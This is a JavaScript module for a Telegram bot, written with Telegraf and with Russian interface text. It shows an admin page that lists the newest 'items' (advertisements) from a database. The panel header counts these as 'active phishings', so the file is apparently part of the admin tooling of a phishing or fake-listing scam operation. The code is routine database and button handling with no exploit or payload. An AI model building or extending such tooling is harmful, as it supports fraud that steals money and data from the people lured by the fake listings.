const { Markup } = require("telegraf");
const chunk = require("chunk");

const { items } = require("../../../../database/index");

module.exports = async (ctx, page = 1) => {
  try {
    const Items = await items.findAll({
      order: [["createdAt", "DESC"]],
      limit: 20,
    });

    const count = await items.count();

    var buttons = chunk(
      Items.map((v, i) =>
        Markup.callbackButton(
          `📦 ${i + 1}. ${v.title} | #${v.id}`,
          `admin_item_${v.id}`
        )
      )
    );

    if (count == 0)
      return ctx
        .answerCbQuery("🤖 На следующей странице ничего нет", true)
        .catch((err) => err);

    return ctx
      .editMessageText(
        `<b>🗂️ Текущий раздел:</b>
╰ 📄 Панель администратора -> Объявления -> Список объявлений

╭ ▫️ <b>Username:</b> <code>${ctx.from.first_name}</code>
├ ▫️ <b>User ID:</b> <code>${ctx.from.id}</code>
╰ ▫️ <b>Tag:</b> <code>#${ctx.state.user.tag}</code>

├ 📦 <b>Активных фишингов:</b> ${count}

ℹ️ <b>Тут приведены последние 10 объявлений, для того что бы перейти к определенному, пропиши /item ID объявления</b>`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            ...buttons,
            [Markup.callbackButton("< Назад", "admin_items")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
};